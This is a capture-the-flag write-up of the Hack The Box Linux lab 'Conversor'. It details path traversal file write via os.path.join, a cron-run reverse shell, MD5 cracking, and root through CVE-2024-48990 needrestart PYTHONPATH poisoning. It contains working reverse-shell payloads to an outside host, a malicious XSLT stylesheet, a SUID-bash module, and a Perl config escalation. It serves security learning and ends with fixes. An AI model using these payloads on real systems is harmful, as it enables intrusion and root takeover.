---
title: "HTB - Conversor"
date: 2026-03-21
description: "Easy Linux machine featuring Flask source code disclosure, arbitrary file write via os.path.join directory traversal into a cron-executed scripts directory, MD5 hash cracking for lateral movement, and root via CVE-2024-48990 PYTHONPATH poisoning in needrestart."
tags: ["htb", "linux", "easy", "flask", "python", "xslt", "directory-traversal", "os-path-join", "cron", "sqlite", "needrestart", "cve-2024-48990", "privesc"]
tools: ["nmap", "ffuf", "burp", "sqlite3", "hashcat"]
---

Conversor is an Easy Linux machine running a Flask web application that converts nmap XML output to HTML using XSLT. The source code is available for download and reveals an insecure use of `os.path.join` that allows writing arbitrary files to a cron-executed scripts directory, giving a shell as `www-data`. From there, an MD5-hashed password in a SQLite database cracks to pivot to the next user. Root comes through CVE-2024-48990, poisoning the `PYTHONPATH` environment variable to get code execution when `needrestart` runs as root via `sudo`.

{{< htb-box-info
  name="Conversor"
  avatar="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0b659c391f2803c247e79c77a3284f96.png"
  os="Linux"
  difficulty="Easy"
  release="25 Oct 2025"
  retire="21 Mar 2026"
  user_blood="NLTE"
  user_blood_url="https://app.hackthebox.com/users/260094"
  user_blood_img="https://account.hackthebox.com/storage/users/5106f57b-8e24-4238-b682-0bf5f1a7baec-avatar.png"
  user_blood_time="00:09:04"
  root_blood="NLTE"
  root_blood_url="https://app.hackthebox.com/users/260094"
  root_blood_img="https://account.hackthebox.com/storage/users/5106f57b-8e24-4238-b682-0bf5f1a7baec-avatar.png"
  root_blood_time="00:21:57"
  creator="FisMatHack"
  creator_url="https://app.hackthebox.com/users/1076236"
  creator_img="https://account.hackthebox.com/storage/users/a45cd394-1a65-454a-bc49-1fd3981fcf00-avatar.png"
>}}

---

## Enumeration

### Port Scan

Two ports open, SSH on 22 and HTTP on 80:

```bash
nmap -p- --min-rate 10000 10.129.238.31
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```bash
nmap -p 22,80 -sCV 10.129.238.31
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

OpenSSH 8.9p1 pins this to Ubuntu 22.04 (Jammy). Port 80 redirects to `conversor.htb`, so I add it to `/etc/hosts`.

### Web Application

Browsing to `http://conversor.htb/` redirects to `/login`. After registering and logging in, the main page is a form to upload an nmap XML file along with an XSLT stylesheet. The app transforms the XML using the stylesheet and stores the resulting HTML report. A template XSLT is available for download.

The `/about` page lists team members, useful as potential usernames. More importantly, the page also offers a download link for `source_code.tar.gz`, the full application source.

Subdomain fuzzing finds nothing:

```bash
ffuf -u http://conversor.htb/ -H "Host: FUZZ.conversor.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 199
```

### Source Code Review

```bash
mkdir src && tar xf source_code.tar.gz -C src/
```

The file structure:

``` {linenos=table}
src/
├── app.py
├── app.wsgi
├── install.md
├── instance/
│   └── users.db
├── scripts/
├── static/
│   ├── images/
│   │   ├── arturo.png
│   │   ├── david.png
│   │   └── fismathack.png
│   ├── nmap.xslt
│   └── style.css
├── templates/
│   ├── about.html
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   └── result.html
└── uploads/
```

`instance/users.db` is a SQLite database (empty in the download). `scripts/` and `uploads/` are also empty.

#### install.md

The setup instructions contain a critical detail. The server runs every Python file in `/var/www/conversor.htb/scripts/` once per minute as `www-data` via cron:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

Any `.py` file written to that directory executes as `www-data` within 60 seconds.

#### app.py

The application sets up key paths at startup:

```python
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
```

The `/convert` route handles the file uploads:

```python {linenos=table}
@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(
            resolve_entities=False, no_network=True,
            dtd_validation=False, load_dtd=False
        )
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute(
            "INSERT INTO files (id,user_id,filename) VALUES (?,?,?)",
            (file_id, session['user_id'], filename)
        )
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
```

Two things stand out. The uploaded filenames go directly into `os.path.join` with no sanitization. The files are also saved to disk before any XML parsing happens, so if parsing fails and raises an exception, the files are already written.

Passwords are stored as MD5 hashes:

```python
password = hashlib.md5(request.form['password'].encode()).hexdigest()
```

---

## Foothold

### Arbitrary File Write via os.path.join

`os.path.join` has two behaviors that make it dangerous with unsanitized input:

1. It does not strip `../` sequences, so path traversal works.
2. If any component starts with `/`, all previous components are discarded. `os.path.join('/var/www/uploads', '/etc/passwd')` returns `/etc/passwd`.

Since the filename comes directly from the multipart request and the files are saved before parsing, I can write any content to any path the web user has write access to. Parsing will fail since the content is not valid XML, but the file is already on disk and the error just gets returned to the browser.

I intercept the upload in Burp Repeater and change both filenames to point at the scripts directory. The content of each file is a Python reverse shell:

For the XML file, setting the filename to an absolute path:

```
Content-Disposition: form-data; name="xml_file"; filename="/var/www/conversor.htb/scripts/shell.py"

import os
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.26/443 0>&1"')
```

For the XSLT file, using a relative traversal:

```
Content-Disposition: form-data; name="xslt_file"; filename="../../../../../../var/www/conversor.htb/scripts/shell2.py"

import os
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.26/444 0>&1"')
```

The server returns an error because neither file is valid XML, but both files are already written to the scripts directory. Within 60 seconds the cron job picks them up.

```bash
rlwrap -cAr nc -lvnp 443
```

```
Connection received on 10.129.238.31
www-data@conversor:~$
```

### PTY Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then `Ctrl+Z` to background, and on the local machine:

```bash
stty raw -echo; fg
```

Type `reset`, hit Enter, then:

```bash
export TERM=xterm
export SHELL=bash
```

### Alternate Foothold: XSLT exslt:document

The XSLT processor is libxslt, which supports the EXSLT `document` extension for writing output to a file. This is an alternative path to write a Python script into the scripts directory without touching the filename parameter at all:

```xml {linenos=table}
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system('bash -c "bash -i >&amp; /dev/tcp/10.10.14.26/443 0>&amp;1"')
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

Note that `&` must be XML-encoded as `&amp;` since this is inside an XML document. The server processes the transform, writes the file, and the cron job executes it within 60 seconds.

### Lateral Movement to fismathack

The SQLite database lives at `/var/www/conversor.htb/instance/users.db`:

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "select * from users;"
```

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
```

The hash is MD5. Cracking with hashcat:

```bash
hashcat -m 0 5b5c3ac3a1c897c94caad48e6c71fdec /usr/share/wordlists/rockyou.txt
```

```
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
```

Password reuse. Switching to `fismathack`:

```bash
su - fismathack
Password: Keepmesafeandwarm
```

User flag in `/home/fismathack/user.txt`:

```
01ff****************************
```

SSH also works with the same password for a cleaner session:

```bash
ssh fismathack@conversor.htb
```

---

## Privilege Escalation

### Enumeration

Checking sudo permissions:

```bash
sudo -l
```

```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

`fismathack` can run `needrestart` as root without a password. Checking the version:

```bash
sudo needrestart --version 2>&1 | head -1
```

```
needrestart 3.7 - Restart daemons after library updates.
```

needrestart 3.7 is vulnerable to several CVEs published in late 2024. The most straightforward is CVE-2024-48990.

### CVE-2024-48990: PYTHONPATH Poisoning

needrestart scans running processes to check if they are using outdated shared libraries. When it finds a Python process, it invokes the Python interpreter to inspect its module dependencies. It reads the `PYTHONPATH` variable from the scanned process's `/proc` environment. A local attacker who controls a running Python process can set a malicious `PYTHONPATH` to load an arbitrary module when needrestart inspects the process as root.

The exploit works by creating a fake `importlib` module. When needrestart runs Python with the poisoned `PYTHONPATH`, Python loads the fake `importlib` first, executing the payload as root.

Create the directory and the malicious module:

```bash
mkdir -p /dev/shm/importlib
```

```python
# /dev/shm/importlib/__init__.py
import os

if os.geteuid() == 0:
    os.system("cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash")
```

Create a long-running Python script to keep a process alive for needrestart to find:

```python
# /dev/shm/run.py
import time
while True:
    time.sleep(1)
```

Run it in the background with the poisoned `PYTHONPATH`:

```bash
PYTHONPATH=/dev/shm python3 /dev/shm/run.py &
```

Trigger needrestart in the same terminal:

```bash
sudo needrestart
```

Check for the SUID binary:

```bash
ls -la /tmp/rootbash
```

```
-rwsrwsrwx 1 root root 1396520 Mar 22 12:00 /tmp/rootbash
```

```bash
/tmp/rootbash -p -c 'bash -p'
```

```bash
id
```

```
uid=1000(fismathack) euid=0(root) egid=0(root) groups=0(root),1000(fismathack)
```

```bash
cat /root/root.txt
```

```
7450****************************
```

### Alternate: needrestart Config GTFOBin

needrestart accepts a custom config file with `-c`. The config file is executed as Perl. A one-line file is enough:

```perl
exec "/bin/bash";
```

Save it and pass it to needrestart:

```bash
echo 'exec "/bin/bash";' > /tmp/evil.conf
sudo needrestart -c /tmp/evil.conf
```

```
root@conversor:/tmp#
```

No CVE required. The config file is eval'd as Perl and runs as root.

---

## Summary

| Step | Detail |
|------|--------|
| Source disclosure | `source_code.tar.gz` available on site, reveals cron job and app logic |
| File write | `os.path.join` with unsanitized filename writes Python shell to scripts directory |
| Shell as www-data | Cron executes the written script within 60 seconds |
| Credential extraction | SQLite database contains fismathack's MD5-hashed password |
| Hash crack | MD5 cracked: `Keepmesafeandwarm` |
| Lateral movement | Password reuse: `su - fismathack` |
| PrivEsc | CVE-2024-48990: PYTHONPATH poisoning via needrestart subprocess inspection |
| Root | SUID bash: `/tmp/rootbash -p -c 'bash -p'` |

## Key Takeaways

**Source code as an attack surface**: The site offers the full application source for download. That immediately reveals the cron job, the database schema, the password hashing scheme, and the file handling logic. In production, source code should never be publicly accessible, and setup instructions like `install.md` should never be committed to a web-accessible directory.

**os.path.join is not a path sanitizer**: Developers often assume that using `os.path.join` with a base directory prevents directory traversal. It does not. A component starting with `/` discards all previous components entirely, and `../` sequences pass through unchanged. Any user-controlled component of a path must be validated against an allowlist or sanitized with `os.path.basename` before joining.

**MD5 is not a password hash**: The application stores passwords as raw MD5 hashes. MD5 is a general-purpose hash function with no salt, no work factor, and vast precomputed rainbow tables available online. Use `bcrypt`, `argon2`, or `scrypt` for password storage.

**CVE-2024-48990 in needrestart**: needrestart before version 3.8 inherits environment variables from scanned processes without sanitization. Since `PYTHONPATH` controls where Python looks for modules, an attacker running a Python process with a poisoned `PYTHONPATH` gets arbitrary code execution the next time needrestart runs as root. Upgrade to needrestart 3.8 or later.

**needrestart config file execution**: Passing a custom config file to needrestart via `-c` executes that file as Perl. If `sudo` allows running needrestart without a password, any Perl code in a user-controlled file runs as root. Restrict `sudo` entries to the minimum necessary and avoid `NOPASSWD` on tools that accept arbitrary file arguments.
